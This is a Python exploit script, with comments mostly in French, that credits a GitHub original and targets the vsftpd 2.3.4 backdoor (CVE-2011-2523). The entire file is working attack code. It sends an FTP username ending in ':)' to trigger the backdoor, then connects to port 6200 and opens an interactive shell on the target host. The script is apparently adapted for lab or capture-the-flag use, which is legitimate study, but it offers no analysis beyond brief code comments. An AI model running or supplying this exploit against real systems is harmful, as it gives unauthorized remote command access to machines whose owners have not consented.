# original code from : https://github.com/padsalatushal/CVE-2011-2523/tree/main
# added a timeout argument, added more information while failing.
# note that this won't work if the version is not 2.3.4 or not using vsftpd

from telnetlib import Telnet
import argparse
import sys
import time  

# créer le parser et l'aide pour celui-ci, puis créer un argument -host permettant d'input l'ip
parser = argparse.ArgumentParser(description='vsftpd 2.3.4 exploit', usage=f'python3 {sys.argv[0]} -host ip_address', epilog=f'EXAMPLE - python3 %(prog)s -host 192.168.168.128')
parser.add_argument('-host', metavar="ip address", dest='host', help="input the ip address of the vulnerable host", required=True)
parser.add_argument('-t', dest='timeout', help="input the timeout, if not set will be 1sec", required=False)
args = parser.parse_args()       
host = args.host # l'ip de la machine 
timeout = args.timeout
if timeout == None :
    timeout = 1

# Checking checking valid args
if len(sys.argv) < 3:
    parser.print_help()  
    sys.exit()

# met des valeurs par défault pour le script (seul le port importe si le service n'est pas sur celui par défault).
portFTP = "21"
user = "USER hackerman:)" # attention si on le change de mettre un :) en fin sinon l'exploit ne fonctionne plus.
password = "PASS pass"

# init la connection
try :
    tn = Telnet(host, portFTP)
    print(f"[+]Opening Connection to {host} on port 21: Done")
except :
    print("[+] Initialisatoin of the connection failed.")

# attend pour etre sur que la connection ai le temps de s'établir
# peut etre nécessaire de l'augmenter si la connection à la machine est lente.
time.sleep(timeout)

# attend que la version soit envoyer (et donc l'init de la connection) pour envoyer le username avec :)
tn.read_until(b"(vsFTPd 2.3.4)")
tn.write(user.encode('ascii') + b"\n") 

# lis jusqu'à ce que le password soit demandé et en envoie un. Puis ferme la connection au FTP car plus nécessaire.
tn.read_until(b"password.")
tn.write(password.encode('ascii') + b"\n")
tn.close() 

# attend l'init du shell sur le port 6200. print un message indiquant la tentative de connection au port 6200
time.sleep(5) 
print(f"[+]Opening Connection to {host} on port 6200: Done")  

# init la connection
try :
    tn2 = Telnet(host, 6200)
    print("[+]Success, shell opened")
    print("[*]Send `exit` to quit shell")
except :
    print("[+] Failed, check if a firewall is in the way.")

# met à disposition le shell pour l'utilisateur.
tn2.interact() 